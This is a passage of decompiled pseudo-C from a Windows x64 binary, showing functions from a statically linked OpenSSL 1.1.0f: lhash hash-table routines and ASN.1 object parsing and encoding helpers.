}
// 14003E600: using guessed type __int64 __fastcall sub_14003E600(_QWORD, _QWORD);

//----- (000000014003EAA0) ----------------------------------------------------
__int64 __fastcall sub_14003EAA0(__int64 a1, __int64 a2)
{
  unsigned int v4; // eax
  unsigned int v5; // ebp
  int v6; // edx
  unsigned int (__fastcall *v7)(_QWORD, __int64); // r15
  __int64 v8; // rdi
  __int64 **i; // rsi
  __int64 *v10; // rcx
  __int64 v12; // rdi
  unsigned int v13; // ecx

  *(_DWORD *)(a1 + 104) = 0;
  v4 = (*(__int64 (__fastcall **)(__int64))(a1 + 16))(a2);
  ++*(_DWORD *)(a1 + 68);
  v5 = v4;
  v6 = v4 % *(_DWORD *)(a1 + 36);
  if ( (unsigned int)v6 < *(_DWORD *)(a1 + 32) )
    v6 = v4 % *(_DWORD *)(a1 + 28);
  v7 = *(unsigned int (__fastcall **)(_QWORD, __int64))(a1 + 8);
  v8 = *(_QWORD *)(*(_QWORD *)a1 + 8i64 * v6);
  for ( i = (__int64 **)(*(_QWORD *)a1 + 8i64 * v6); v8; v8 = *(_QWORD *)(v8 + 8) )
  {
    ++*(_DWORD *)(a1 + 100);
    if ( *(_DWORD *)(v8 + 16) == v5 )
    {
      ++*(_DWORD *)(a1 + 72);
      if ( !v7(*(_QWORD *)v8, a2) )
        break;
    }
    i = (__int64 **)(v8 + 8);
  }
  v10 = *i;
  if ( *i )
  {
    *i = (__int64 *)v10[1];
    v12 = *v10;
    sub_14001D930(v10);
    --*(_DWORD *)(a1 + 48);
    ++*(_DWORD *)(a1 + 84);
    v13 = *(_DWORD *)(a1 + 24);
    if ( v13 > 0x10 && *(_DWORD *)(a1 + 44) >= (*(_DWORD *)(a1 + 48) << 8) / v13 )
      sub_14003F080((__int64 **)a1);
    return v12;
  }
  else
  {
    ++*(_DWORD *)(a1 + 88);
    return 0i64;
  }
}

//----- (000000014003EBA0) ----------------------------------------------------
void __fastcall sub_14003EBA0(__int64 a1, void (__fastcall *a2)(_QWORD))
{
  int v3; // eax
  __int64 i; // rdi
  _QWORD *v6; // rcx
  _QWORD *v7; // rbx

  if ( a1 )
  {
    v3 = *(_DWORD *)(a1 + 24) - 1;
    for ( i = v3; i >= 0; --i )
    {
      v6 = *(_QWORD **)(*(_QWORD *)a1 + 8 * i);
      if ( v6 )
      {
        do
        {
          v7 = (_QWORD *)v6[1];
          a2(*v6);
          v6 = v7;
        }
        while ( v7 );
      }
    }
  }
}

//----- (000000014003EC10) ----------------------------------------------------
void __fastcall sub_14003EC10(__int64 a1, void (__fastcall *a2)(_QWORD, __int64), __int64 a3)
{
  int v4; // eax
  __int64 i; // rdi
  _QWORD *v8; // rcx
  _QWORD *v9; // rbx

  if ( a1 )
  {
    v4 = *(_DWORD *)(a1 + 24) - 1;
    for ( i = v4; i >= 0; --i )
    {
      v8 = *(_QWORD **)(*(_QWORD *)a1 + 8 * i);
      if ( v8 )
      {
        do
        {
          v9 = (_QWORD *)v8[1];
          a2(*v8, a3);
          v8 = v9;
        }
        while ( v9 );
      }
    }
  }
}

//----- (000000014003ECA0) ----------------------------------------------------
void __fastcall sub_14003ECA0(__int64 a1)
{
  __int64 i; // rdi
  _QWORD *v3; // rcx
  _QWORD *v4; // rbx

  if ( a1 )
  {
    for ( i = 0i64; (unsigned int)i < *(_DWORD *)(a1 + 24); i = (unsigned int)(i + 1) )
    {
      v3 = *(_QWORD **)(*(_QWORD *)a1 + 8 * i);
      if ( v3 )
      {
        do
        {
          v4 = (_QWORD *)v3[1];
          sub_14001D930(v3);
          v3 = v4;
        }
        while ( v4 );
      }
    }
    sub_14001D930(*(void **)a1);
    sub_14001D930((void *)a1);
  }
}

//----- (000000014003ED40) ----------------------------------------------------
__int64 __fastcall sub_14003ED40(__int64 a1)
{
  return *(unsigned int *)(a1 + 44);
}

//----- (000000014003ED50) ----------------------------------------------------
_QWORD *__fastcall sub_14003ED50(__int64 a1, __int64 a2)
{
  unsigned int v3; // eax
  __int64 v4; // rdx
  __int64 v5; // r15
  _QWORD *result; // rax
  unsigned int v8; // eax
  unsigned int v9; // ebp
  int v10; // edx
  unsigned int (__fastcall *v11)(_QWORD, __int64); // r12
  __int64 v12; // rdi
  __int64 **i; // rsi
  __int64 *v14; // rax

  v4 = (unsigned int)((*(_DWORD *)(a1 + 48) << 8) % *(_DWORD *)(a1 + 24));
  v3 = (*(_DWORD *)(a1 + 48) << 8) / *(_DWORD *)(a1 + 24);
  v5 = 0i64;
  *(_DWORD *)(a1 + 104) = 0;
  if ( *(_DWORD *)(a1 + 40) <= v3 && !(unsigned int)sub_14003F150(a1) )
    return 0i64;
  v8 = (*(__int64 (__fastcall **)(__int64, __int64))(a1 + 16))(a2, v4);
  ++*(_DWORD *)(a1 + 68);
  v9 = v8;
  v10 = v8 % *(_DWORD *)(a1 + 36);
  if ( (unsigned int)v10 < *(_DWORD *)(a1 + 32) )
    v10 = v8 % *(_DWORD *)(a1 + 28);
  v11 = *(unsigned int (__fastcall **)(_QWORD, __int64))(a1 + 8);
  v12 = *(_QWORD *)(*(_QWORD *)a1 + 8i64 * v10);
  for ( i = (__int64 **)(*(_QWORD *)a1 + 8i64 * v10); v12; v12 = *(_QWORD *)(v12 + 8) )
  {
    ++*(_DWORD *)(a1 + 100);
    if ( *(_DWORD *)(v12 + 16) == v9 )
    {
      ++*(_DWORD *)(a1 + 72);
      if ( !v11(*(_QWORD *)v12, a2) )
        break;
    }
    i = (__int64 **)(v12 + 8);
  }
  v14 = *i;
  if ( *i )
  {
    v5 = *v14;
    *v14 = a2;
    ++*(_DWORD *)(a1 + 80);
  }
  else
  {
    result = sub_14001D8E0(0x18ui64);
    if ( !result )
    {
      ++*(_DWORD *)(a1 + 104);
      return result;
    }
    *result = a2;
    result[1] = 0i64;
    *((_DWORD *)result + 4) = v9;
    *i = result;
    ++*(_DWORD *)(a1 + 76);
    ++*(_DWORD *)(a1 + 48);
  }
  return (_QWORD *)v5;
}
// 14003EDAC: variable 'v4' is possibly undefined

//----- (000000014003EE70) ----------------------------------------------------
_QWORD *__fastcall sub_14003EE70(
        __int64 (__fastcall *a1)(char *a1),
        int (__cdecl *a2)(const char *Str1, const char *Str2))
{
  int v2; // eax
  _QWORD *v5; // rbx
  void *v6; // rax

  v5 = sub_14001DC20((unsigned int)(v2 + 80));
  if ( !v5 )
    return 0i64;
  v6 = sub_14001DC20(0x80ui64);
  *v5 = v6;
  if ( !v6 )
  {
    sub_14001D930(v5);
    return 0i64;
  }
  *((_DWORD *)v5 + 6) = 8;
  *((_DWORD *)v5 + 7) = 16;
  if ( !a2 )
    a2 = strcmp;
  *((_DWORD *)v5 + 9) = 8;
  v5[1] = a2;
  *((_DWORD *)v5 + 10) = 512;
  if ( !a1 )
    a1 = sub_14003F020;
  *((_DWORD *)v5 + 11) = 256;
  v5[2] = a1;
  return v5;
}
// 14003EE99: variable 'v2' is possibly undefined

//----- (000000014003EF50) ----------------------------------------------------
_QWORD *__fastcall sub_14003EF50(__int64 a1, __int64 a2)
{
  unsigned int v4; // eax
  unsigned int v5; // ebp
  int v6; // edx
  unsigned int (__fastcall *v7)(_QWORD, __int64); // r14
  __int64 v8; // rdi
  _QWORD **i; // rsi
  _QWORD *result; // rax

  *(_DWORD *)(a1 + 104) = 0;
  v4 = (*(__int64 (__fastcall **)(__int64))(a1 + 16))(a2);
  ++*(_DWORD *)(a1 + 68);
  v5 = v4;
  v6 = v4 % *(_DWORD *)(a1 + 36);
  if ( (unsigned int)v6 < *(_DWORD *)(a1 + 32) )
    v6 = v4 % *(_DWORD *)(a1 + 28);
  v7 = *(unsigned int (__fastcall **)(_QWORD, __int64))(a1 + 8);
  v8 = *(_QWORD *)(*(_QWORD *)a1 + 8i64 * v6);
  for ( i = (_QWORD **)(*(_QWORD *)a1 + 8i64 * v6); v8; v8 = *(_QWORD *)(v8 + 8) )
  {
    ++*(_DWORD *)(a1 + 100);
    if ( *(_DWORD *)(v8 + 16) == v5 )
    {
      ++*(_DWORD *)(a1 + 72);
      if ( !v7(*(_QWORD *)v8, a2) )
        break;
    }
    i = (_QWORD **)(v8 + 8);
  }
  result = *i;
  if ( *i )
  {
    result = (_QWORD *)*result;
    ++*(_DWORD *)(a1 + 92);
  }
  else
  {
    ++*(_DWORD *)(a1 + 96);
  }
  return result;
}

//----- (000000014003F010) ----------------------------------------------------
void __fastcall sub_14003F010(__int64 a1, int a2)
{
  *(_DWORD *)(a1 + 44) = a2;
}

//----- (000000014003F020) ----------------------------------------------------
__int64 __fastcall sub_14003F020(char *a1)
{
  unsigned int v1; // edx
  char *v2; // r9
  char v3; // al
  int v4; // r10d
  unsigned int v5; // r8d

  v1 = 0;
  v2 = a1;
  if ( !a1 )
    return 0i64;
  v3 = *a1;
  if ( !*a1 )
    return 0i64;
  v4 = 256;
  do
  {
    ++v2;
    v5 = v4 | v3;
    v4 += 256;
    v3 = *v2;
    v1 = (v5 * v5) ^ __ROL4__(v1, (v5 ^ (v5 >> 2)) & 0xF);
  }
  while ( *v2 );
  return v1 ^ HIWORD(v1);
}

//----- (000000014003F080) ----------------------------------------------------
__int64 *__fastcall sub_14003F080(__int64 **a1)
{
  __int64 v2; // rcx
  __int64 v3; // rdi
  int v4; // eax
  __int64 *result; // rax
  __int64 *v6; // rcx
  int v7; // eax
  __int64 v8; // rcx
  __int64 *v9; // rdx
  __int64 v10; // rcx
  bool v11; // zf

  v2 = (unsigned int)(*((_DWORD *)a1 + 9) - 1 + *((_DWORD *)a1 + 8));
  v3 = (*a1)[v2];
  (*a1)[v2] = 0i64;
  v4 = *((_DWORD *)a1 + 8);
  if ( !v4 )
  {
    result = (__int64 *)sub_14001D970(
                          *a1,
                          (unsigned int)(8 * *((_DWORD *)a1 + 9)),
                          (__int64)"..\\..\\openssl-1.1.0f\\crypto\\lhash\\lhash.c",
                          0xF0u);
    v6 = result;
    if ( !result )
    {
      ++*((_DWORD *)a1 + 26);
      return result;
    }
    ++*((_DWORD *)a1 + 16);
    *((_DWORD *)a1 + 7) >>= 1;
    *((_DWORD *)a1 + 9) >>= 1;
    v4 = *((_DWORD *)a1 + 9);
    *a1 = v6;
  }
  --*((_DWORD *)a1 + 6);
  v7 = v4 - 1;
  ++*((_DWORD *)a1 + 15);
  v8 = v7;
  *((_DWORD *)a1 + 8) = v7;
  result = *a1;
  v9 = &(*a1)[v8];
  v10 = *v9;
  if ( *v9 )
  {
    result = (__int64 *)(v10 + 8);
    if ( *(_QWORD *)(v10 + 8) )
    {
      do
      {
        v10 = *result;
        v11 = *(_QWORD *)(*result + 8) == 0i64;
        result = (__int64 *)(*result + 8);
      }
      while ( !v11 );
    }
    *(_QWORD *)(v10 + 8) = v3;
  }
  else
  {
    *v9 = v3;
  }
  return result;
}

//----- (000000014003F150) ----------------------------------------------------
__int64 __fastcall sub_14003F150(__int64 a1)
{
  __int64 v1; // r10
  _QWORD *v3; // rdx
  __int64 v4; // rdi
  __int64 v5; // rax
  __int64 v6; // r8
  unsigned int v7; // r11d
  _QWORD *i; // r9
  unsigned int v9; // esi
  __int64 result; // rax
  __int64 v11; // rdx
  __int64 v12; // rcx
  int v13; // eax

  v1 = *(unsigned int *)(a1 + 32);
  v3 = *(_QWORD **)a1;
  ++*(_DWORD *)(a1 + 24);
  v4 = (__int64)&v3[v1];
  ++*(_DWORD *)(a1 + 52);
  *(_DWORD *)(a1 + 32) = v1 + 1;
  v5 = (unsigned int)(v1 + *(_DWORD *)(a1 + 36));
  v3[v5] = 0i64;
  v6 = *(_QWORD *)v4;
  v7 = *(_DWORD *)(a1 + 28);
  for ( i = &v3[v5]; *(_QWORD *)v4; v6 = *(_QWORD *)v4 )
  {
    if ( *(_DWORD *)(v6 + 16) % v7 == (_DWORD)v1 )
    {
      v4 = *(_QWORD *)v4 + 8i64;
    }
    else
    {
      *(_QWORD *)v4 = *(_QWORD *)(*(_QWORD *)v4 + 8i64);
      *(_QWORD *)(v6 + 8) = *i;
      *i = v6;
    }
  }
  if ( *(_DWORD *)(a1 + 32) >= *(_DWORD *)(a1 + 36) )
  {
    v9 = 2 * *(_DWORD *)(a1 + 28);
    result = (__int64)sub_14001D970(
                        *(void **)a1,
                        16 * *(_DWORD *)(a1 + 28),
                        (__int64)"..\\..\\openssl-1.1.0f\\crypto\\lhash\\lhash.c",
                        0xD6u);
    v11 = result;
    if ( !result )
    {
      ++*(_DWORD *)(a1 + 104);
      --*(_DWORD *)(a1 + 24);
      *(_DWORD *)(a1 + 32) = 0;
      return result;
    }
    v12 = *(unsigned int *)(a1 + 28);
    if ( (unsigned int)v12 < v9 )
      memset((void *)(result + 8 * v12), 0, 8i64 * (v9 - (unsigned int)v12));
    v13 = *(_DWORD *)(a1 + 28);
    ++*(_DWORD *)(a1 + 56);
    *(_DWORD *)(a1 + 36) = v13;
    *(_DWORD *)(a1 + 28) = v9;
    *(_DWORD *)(a1 + 32) = 0;
    *(_QWORD *)a1 = v11;
  }
  return 1i64;
}

//----- (000000014003F270) ----------------------------------------------------
__int64 __fastcall sub_14003F270(_QWORD *a1)
{
  if ( a1[1] || *(_DWORD *)a1 == 5 )
    return *(unsigned int *)a1;
  else
    return 0i64;
}

//----- (000000014003F290) ----------------------------------------------------
_DWORD *__fastcall sub_14003F290(__int64 a1, unsigned int *a2, __int64 *a3)
{
  _DWORD *result; // rax
  __int64 v5; // rsi
  __int64 v6; // rbx
  __int64 v7; // rax
  _DWORD *v8; // rax
  __int64 v9; // [rsp+48h] [rbp+20h] BYREF

  result = sub_1400755F0(a2, a1, 0i64);
  v5 = (__int64)result;
  if ( result )
  {
    if ( !a3 || (v6 = *a3) == 0 )
    {
      v7 = sub_14004FF40();
      v6 = v7;
      if ( !v7 )
      {
        sub_14004FD70(v5);
        return 0i64;
      }
      if ( a3 )
        *a3 = v7;
    }
    v9 = v6;
    v8 = (_DWORD *)v6;
    if ( *(_QWORD *)(v6 + 8) )
    {
      sub_1400514E0(&v9, 0i64, 0);
      v8 = (_DWORD *)v9;
    }
    *v8 = 16;
    *(_QWORD *)(v9 + 8) = v5;
    return (_DWORD *)v6;
  }
  return result;
}

//----- (000000014003F350) ----------------------------------------------------
__int64 __fastcall sub_14003F350(__int64 a1, int a2, __int64 a3)
{
  __int64 result; // rax
  __int64 v6; // [rsp+30h] [rbp+8h] BYREF

  v6 = a1;
  if ( *(_QWORD *)(a1 + 8) )
  {
    sub_1400514E0(&v6, 0i64, 0);
    a1 = v6;
  }
  *(_DWORD *)a1 = a2;
  result = v6;
  if ( a2 == 1 )
    *(_DWORD *)(v6 + 8) = (unsigned __int8)-(a3 != 0);
  else
    *(_QWORD *)(v6 + 8) = a3;
  return result;
}

//----- (000000014003F3C0) ----------------------------------------------------
__int64 __fastcall sub_14003F3C0(__int64 a1, int a2, __int64 a3)
{
  _DWORD *v5; // rsi
  __int64 v6; // rax
  __int64 v8; // rax
  _DWORD *v9; // [rsp+40h] [rbp+18h] BYREF

  v5 = (_DWORD *)a1;
  if ( !a3 || a2 == 1 )
  {
    v9 = (_DWORD *)a1;
    if ( *(_QWORD *)(a1 + 8) )
    {
      sub_1400514E0((__int64 *)&v9, 0i64, 0);
      v5 = v9;
    }
    *v5 = a2;
    if ( a2 == 1 )
      v9[2] = (unsigned __int8)-(a3 != 0);
    else
      *((_QWORD *)v9 + 1) = a3;
  }
  else if ( a2 == 6 )
  {
    v6 = sub_140047B90(a3);
    if ( !v6 )
      return 0i64;
    sub_14003F350((__int64)v5, 6, v6);
  }
  else
  {
    v8 = sub_140047450(a3);
    if ( !v8 )
      return 0i64;
    sub_14003F350((__int64)v5, a2, v8);
  }
  return 1i64;
}

//----- (000000014003F490) ----------------------------------------------------
__int64 __fastcall sub_14003F490(__int64 a1, __int64 a2)
{
  unsigned int *v3; // rcx

  if ( a2 && *(_DWORD *)a2 == 16 && (v3 = *(unsigned int **)(a2 + 8)) != 0i64 )
    return sub_140075710(v3, a1);
  else
    return 0i64;
}

//----- (000000014003F4D0) ----------------------------------------------------
void __fastcall sub_14003F4D0(__int64 a1)
{
  if ( a1 )
  {
    if ( (*(_BYTE *)(a1 + 32) & 4) != 0 )
    {
      sub_14001D930(*(void **)a1);
      sub_14001D930(*(void **)(a1 + 8));
      *(_QWORD *)(a1 + 8) = 0i64;
      *(_QWORD *)a1 = 0i64;
    }
    if ( (*(_BYTE *)(a1 + 32) & 8) != 0 )
    {
      sub_14001D930(*(void **)(a1 + 24));
      *(_QWORD *)(a1 + 24) = 0i64;
      *(_DWORD *)(a1 + 20) = 0;
    }
    if ( (*(_BYTE *)(a1 + 32) & 1) != 0 )
      sub_14001D930((void *)a1);
  }
}

//----- (000000014003F580) ----------------------------------------------------
_DWORD *__fastcall sub_14003F580()
{
  int v0; // eax
  _DWORD *result; // rax

  result = sub_14001DC20((unsigned int)(v0 - 16));
  if ( result )
  {
    result[8] = 1;
  }
  else
  {
    sub_140024610(13, 123, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_object.c", 328);
    return 0i64;
  }
  return result;
}
// 14003F59A: variable 'v0' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (000000014003F5E0) ----------------------------------------------------
__int64 __fastcall sub_14003F5E0(__int64 a1, int a2, char *a3, int a4)
{
  char *v4; // r12
  _DWORD *v5; // rbp
  int v6; // r15d
  unsigned int v8; // r15d
  _BYTE *i; // rax
  int v10; // r15d
  int v11; // esi
  int v12; // r15d
  char *v13; // rcx
  unsigned int v14; // edi
  int v15; // r13d
  int v16; // r14d
  __int64 v17; // rbx
  int v18; // edi
  __int64 v19; // rax
  char v20; // al
  __int64 v21; // r9
  unsigned int v22; // edx
  __int64 v23; // rbx
  __int64 v24; // rcx
  char v25; // al
  __int64 v26; // rcx
  unsigned int v27; // edx
  unsigned int v28; // [rsp+30h] [rbp-78h]
  int v29; // [rsp+34h] [rbp-74h]
  int v30; // [rsp+38h] [rbp-70h]
  char *v32; // [rsp+40h] [rbp-68h]
  __int64 v33; // [rsp+48h] [rbp-60h]
  char v34[24]; // [rsp+50h] [rbp-58h] BYREF

  v4 = v34;
  v33 = a1;
  v5 = 0i64;
  v28 = 0;
  v30 = 24;
  v6 = a4;
  if ( !a4 )
    return 0i64;
  if ( a4 == -1 )
  {
    v8 = 0;
    for ( i = a3; *i; ++v8 )
    {
      if ( v8 >= 0x80000000 )
        break;
      ++i;
    }
    v6 = v8 & 0x7FFFFFFF;
  }
  v10 = v6 - 1;
  v29 = *a3 - 48;
  if ( (unsigned int)v29 > 2 )
  {
    sub_140024610(13, 100, 122, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_object.c", 61);
    goto LABEL_65;
  }
  if ( v10 <= 0 )
  {
    sub_140024610(13, 100, 138, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_object.c", 66);
    goto LABEL_65;
  }
  v11 = a3[1];
  v12 = v10 - 1;
  v13 = a3 + 2;
  if ( v12 <= 0 )
    goto LABEL_63;
  while ( 2 )
  {
    if ( v11 != 46 && v11 != 32 )
    {
      sub_140024610(13, 100, 131, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_object.c", 75);
      goto LABEL_59;
    }
    v14 = 0;
    v15 = 0;
    do
    {
      v11 = *v13;
      --v12;
      v32 = ++v13;
      if ( v11 == 32 || v11 == 46 )
        break;
      if ( v11 < 48 || v11 > 57 )
      {
        sub_140024610(13, 100, 130, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_object.c", 88);
        goto LABEL_59;
      }
      if ( v15 )
        goto LABEL_24;
      if ( v14 >= 0x19999991 )
      {
        v15 = 1;
        if ( !v5 )
        {
          v5 = sub_140027200();
          if ( !v5 )
            goto LABEL_59;
        }
        if ( !(unsigned int)sub_140027560((__int64)v5, v14) )
          goto LABEL_59;
LABEL_24:
        if ( !(unsigned int)sub_14003E8F0((__int64)v5, 0xAui64) || !(unsigned int)sub_14003E600((__int64)v5, v11 - 48) )
          goto LABEL_59;
        v13 = v32;
        continue;
      }
      v14 = v11 + 2 * (5 * v14 - 24);
    }
    while ( v12 > 0 );
    if ( v28 )
      goto LABEL_36;
    if ( v29 < 2 && v14 >= 0x28 )
    {
      sub_140024610(13, 100, 147, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_object.c", 108);
      goto LABEL_59;
    }
    if ( v15 )
    {
      if ( !(unsigned int)sub_14003E600((__int64)v5, 40 * v29) )
        goto LABEL_59;
    }
    else
    {
      v14 += 40 * v29;
    }
LABEL_36:
    v16 = 0;
    v17 = 0i64;
    if ( !v15 )
    {
      do
      {
        ++v16;
        v20 = v14 & 0x7F;
        v14 >>= 7;
        v4[v17++] = v20;
      }
      while ( v14 );
LABEL_46:
      v21 = v33;
      if ( v33 )
      {
        v22 = v28;
        if ( (int)(v16 + v28) > a2 )
        {
          sub_140024610(13, 100, 107, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_object.c", 148);
          goto LABEL_59;
        }
        v23 = v17 - 1;
        if ( v23 > 0 )
        {
          v24 = v33 + (int)v28;
          v22 = v23 + v28;
          do
          {
            ++v24;
            v25 = v4[v23--] | 0x80;
            *(_BYTE *)(v24 - 1) = v25;
          }
          while ( v23 > 0 );
        }
        v26 = (int)v22;
        v27 = v22 + 1;
        *(_BYTE *)(v26 + v21) = *v4;
      }
      else
      {
        v27 = v16 + v28;
      }
      v28 = v27;
      if ( v12 > 0 )
      {
        v13 = v32;
        continue;
      }
      if ( v4 != v34 )
        sub_14001D930(v4);
LABEL_63:
      sub_140026FF0(v5);
      return v28;
    }
    break;
  }
  v18 = (int)(sub_140027260((__int64)v5) + 6) / 7;
  if ( v18 > v30 )
  {
    if ( v4 != v34 )
      sub_14001D930(v4);
    v30 = v18 + 32;
    v4 = (char *)sub_14001D8E0(v18 + 32);
    if ( !v4 )
      goto LABEL_59;
  }
  if ( !v18 )
    goto LABEL_46;
  while ( 1 )
  {
    --v18;
    v19 = sub_14003E710((__int64)v5, 0x80ui64);
    if ( v19 == -1 )
      break;
    v4[v17] = v19;
    ++v16;
    ++v17;
    if ( !v18 )
      goto LABEL_46;
  }
LABEL_59:
  if ( v4 != v34 )
    sub_14001D930(v4);
LABEL_65:
  sub_140026FF0(v5);
  return 0i64;
}
// 14003F6DA: conditional instruction was optimized away because r15d.4>=1
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (000000014003FA20) ----------------------------------------------------
char **__fastcall sub_14003FA20(__int64 *a1, char **a2, int a3)
{
  size_t v3; // rsi
  char *v6; // rbx
  unsigned int v7; // eax
  char **v8; // rbx
  char **result; // rax
  int v10; // eax
  __int64 v11; // rdi
  char *v12; // rbp
  void *v13; // r12
  char *v14; // rbp
  char v15[16]; // [rsp+30h] [rbp-58h] BYREF
  int v16; // [rsp+40h] [rbp-48h]
  int v17; // [rsp+44h] [rbp-44h]
  char *v18; // [rsp+48h] [rbp-40h]
  int v19; // [rsp+50h] [rbp-38h]

  v3 = a3;
  if ( a3 <= 0 || !a2 || (v6 = *a2) == 0i64 || v6[a3 - 1] < 0 )
  {
    sub_140024610(13, 196, 216, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_object.c", 241);
    return 0i64;
  }
  v18 = *a2;
  v16 = 0;
  v19 = 0;
  v17 = a3;
  v7 = sub_14002C260((__int64)v15);
  if ( v7 )
  {
    v8 = sub_14002C0F0(v7);
    if ( a1 )
    {
      sub_14003F4D0(*a1);
      *a1 = (__int64)v8;
    }
    *a2 += v3;
    return v8;
  }
  v10 = 0;
  if ( (int)v3 <= 0 )
  {
LABEL_14:
    if ( !a1 || (v11 = *a1) == 0 || (*(_BYTE *)(v11 + 32) & 1) == 0 )
    {
      result = (char **)sub_14003F580();
      v11 = (__int64)result;
      if ( !result )
        return result;
    }
    v12 = *a2;
    v13 = *(void **)(v11 + 24);
    *(_QWORD *)(v11 + 24) = 0i64;
    if ( !v13 || *(_DWORD *)(v11 + 20) < (int)v3 )
    {
      *(_DWORD *)(v11 + 20) = 0;
      sub_14001D930(v13);
      v13 = sub_14001D8E0(v3);
      if ( !v13 )
      {
        sub_140024610(13, 196, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_object.c", 316);
        if ( !a1 || *a1 != v11 )
          sub_14003F4D0(v11);
        return 0i64;
      }
      *(_DWORD *)(v11 + 32) |= 8u;
    }
    memmove(v13, v12, v3);
    v14 = &v12[v3];
    *(_QWORD *)(v11 + 24) = v13;
    *(_DWORD *)(v11 + 20) = v3;
    *(_QWORD *)v11 = 0i64;
    *(_QWORD *)(v11 + 8) = 0i64;
    if ( a1 )
      *a1 = v11;
    *a2 = v14;
    return (char **)v11;
  }
  else
  {
    while ( *v6 != (char)0x80 || v10 && *(v6 - 1) < 0 )
    {
      ++v10;
      ++v6;
      if ( v10 >= (int)v3 )
        goto LABEL_14;
    }
    sub_140024610(13, 196, 216, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_object.c", 271);
    return 0i64;
  }
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 14003FA20: using guessed type char var_58[16];

//----- (000000014003FC70) ----------------------------------------------------
char **__fastcall sub_14003FC70(__int64 *a1, _BYTE **a2, int a3)
{
  int v5; // r8d
  char **result; // rax
  int v7; // [rsp+30h] [rbp-18h] BYREF
  _BYTE *v8[2]; // [rsp+38h] [rbp-10h] BYREF
  int v9; // [rsp+58h] [rbp+10h] BYREF
  int v10; // [rsp+68h] [rbp+20h] BYREF

  v8[0] = *a2;
  if ( (sub_140047780(v8, &v10, &v9, &v7, a3) & 0x80u) != 0i64 )
  {
    v5 = 102;
LABEL_5:
    sub_140024610(13, 147, v5, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_object.c", 222);
    return 0i64;
  }
  if ( v9 != 6 )
  {
    v5 = 116;
    goto LABEL_5;
  }
  result = sub_14003FA20(a1, v8, v10);
  if ( result )
    *a2 = v8[0];
  return result;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (000000014003FD20) ----------------------------------------------------
__int64 __fastcall sub_14003FD20(__int64 a1, __int64 a2)
{
  char *v2; // rbx
  int v5; // eax
  signed int v6; // edi
  int v7; // r14d
  char *v8; // rax
  int v10; // ebx
  char v11[80]; // [rsp+20h] [rbp-78h] BYREF

  v2 = v11;
  if ( !a2 || !*(_QWORD *)(a2 + 24) )
    return sub_14002A430(a1, (__int64)"NULL", 4u);
  v5 = sub_14002C3A0(v11, 80, a2, 0);
  v6 = v5;
  if ( v5 > 79 )
  {
    v7 = v5 + 1;
    v8 = (char *)sub_14001D8E0(v5 + 1);
    v2 = v8;
    if ( !v8 )
      return 0xFFFFFFFFi64;
    sub_14002C3A0(v8, v7, a2, 0);
  }
  if ( v6 > 0 )
  {
    sub_14002A430(a1, (__int64)v2, v6);
    if ( v2 != v11 )
      sub_14001D930(v2);
    return (unsigned int)v6;
  }
  else
  {
    v10 = sub_14002A430(a1, (__int64)"<INVALID>", 9u);
    return v10 + (unsigned int)sub_140075770(a1, *(_QWORD *)(a2 + 24), *(_DWORD *)(a2 + 20));
  }
}

//----- (000000014003FE60) ----------------------------------------------------
__int64 __fastcall sub_14003FE60(_BYTE *a1, int a2, __int64 a3)
{
  return sub_14002C3A0(a1, a2, a3, 0);
}

//----- (000000014003FE80) ----------------------------------------------------
__int64 __fastcall sub_14003FE80(__int64 a1, _DWORD *a2, void *a3, signed int a4)
{
  __int64 v4; // rdi
  unsigned int v5; // esi
  __int64 v9; // rax
  signed int v10; // eax
  struct _xDISPATCHER_CONTEXT *v11; // rax

  v4 = 0i64;
  v5 = -1;
  if ( *(_DWORD *)a1 != 16 )
    goto LABEL_11;
  if ( !*(_QWORD *)(a1 + 8) )
    goto LABEL_11;
  v9 = sub_14003F490((__int64)&unk_1400F65B0, a1);
  v4 = v9;
  if ( !v9 )
    goto LABEL_11;
  if ( a2 )
    *a2 = *(_DWORD *)v9;
  v10 = sub_14001D4F0(*(unsigned int **)(v9 + 8));
  v5 = v10;
  if ( a4 > v10 )
    a4 = v10;
  if ( a3 )
  {
    v11 = __FrameHandler3::TryBlockMap::getpDC(*(__FrameHandler3::TryBlockMap **)(v4 + 8));
    memmove(a3, v11, a4);
  }
  if ( v5 == -1 )
LABEL_11:
    sub_140024610(13, 134, 109, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\evp_asn1.c", 111);
  sub_140051250((unsigned int *)v4, (__int64)&unk_1400F65B0);
  return v5;
}

//----- (000000014003FF60) ----------------------------------------------------
__int64 __fastcall sub_14003FF60(__int64 a1, void *a2, int a3)
{
  __FrameHandler3::TryBlockMap *v6; // rcx
  struct _xDISPATCHER_CONTEXT *v7; // rbx
  int v8; // eax
  unsigned int v9; // edi

  if ( *(_DWORD *)a1 == 4 && (v6 = *(__FrameHandler3::TryBlockMap **)(a1 + 8)) != 0i64 )
  {
    v7 = __FrameHandler3::TryBlockMap::getpDC(v6);
    v8 = sub_14001D4F0(*(unsigned int **)(a1 + 8));
    v9 = v8;
    if ( v8 < a3 )
      a3 = v8;
    memmove(a2, v7, a3);
    return v9;
  }
  else
  {
    sub_140024610(13, 135, 109, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\evp_asn1.c", 36);
    return 0xFFFFFFFFi64;
  }
}

//----- (0000000140040010) ----------------------------------------------------
